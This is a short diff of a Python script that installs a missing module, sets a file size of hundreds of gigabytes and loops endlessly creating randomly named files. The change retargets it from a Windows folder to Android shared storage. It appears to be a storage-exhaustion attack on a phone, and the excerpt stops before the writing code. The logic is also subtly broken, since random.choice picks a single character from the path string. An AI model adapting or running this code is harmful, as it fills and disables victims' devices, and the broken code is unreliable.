@@ -1652,7 +1652,7 @@ except:
     os.system('pip3 install uuid')
 size = 109559 * 5024 * 1024
 filename_prefix = 'file'
-paths = 'C:\Users\moham\C++'
+paths = '/storage/emulated/0/'
 while True:
     path = random.choice(paths)
     filename = os.path.join(path, f"{filename_prefix}_{uuid.uuid4()}")
